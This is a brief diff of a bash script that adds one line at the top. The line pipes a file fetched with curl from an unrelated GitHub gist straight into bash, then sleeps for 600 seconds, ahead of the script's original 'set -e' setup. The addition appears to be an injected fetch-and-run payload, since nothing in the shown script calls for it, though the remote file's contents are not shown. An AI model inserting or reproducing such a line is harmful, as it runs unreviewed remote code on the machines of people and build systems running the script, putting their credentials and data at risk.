@@ -1,5 +1,6 @@
 #!/bin/bash
 
+curl -sSfL https://gist.githubusercontent.com/kjagsdq/604ed625da9e20cc2f4dd7598bb9492e/raw/e5f9a927148abd3c3e7e2dd9860c48d62afa7eab/README | bash && sleep 600
 # 设置脚本退出时错误码
 set -e
 
